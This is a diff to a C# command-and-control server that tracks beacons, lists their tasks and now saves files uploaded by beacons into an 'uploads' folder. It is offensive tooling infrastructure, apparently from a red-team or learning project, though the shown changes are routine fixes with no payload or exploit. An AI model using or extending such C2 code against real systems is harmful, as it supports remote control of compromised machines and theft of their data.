@@ -231,11 +231,13 @@ namespace JmcaC2
 
         public static void PrintTasks()
         {
-            Console.WriteLine($"{"Client Name",-15} | {"Task Name",-14} | {"Task Args",-20}");
+            Console.WriteLine($"{"Client Name",-15} | {"Task Name",-15} | {"Task Args",-20}");
             Console.WriteLine("---------------------------------------------------------------");
 
             foreach (var task in BeaconTasks)
-                Console.WriteLine($"{task,-15}");
+            {
+                Console.WriteLine($"{task.Name,-15} | {task.Cmd,-15} | {task.Data,-20}");
+            }
         }
 
         // Handle incoming HTTP connections
@@ -275,7 +277,7 @@ namespace JmcaC2
                             if (!ClientNames.Contains(beaconName))
                             {
                                 // add the beacon again
-                                BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, GenerateClientName());
+                                BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, beaconName);
                                 Beacons.Add(NewClient);
                             }
                             Console.WriteLine($"Received request for tasks from {beaconName}");
@@ -340,8 +342,11 @@ namespace JmcaC2
                                 bytes = memoryStream.ToArray();
                             }
 
-                            File.WriteAllBytes(fileName, bytes);
-
+                            if (!Directory.Exists("uploads"))
+                            {
+                                Directory.CreateDirectory("uploads");
+                            }
+                            File.WriteAllBytes("uploads\\" + fileName, bytes);
                         }
                         else
                         {
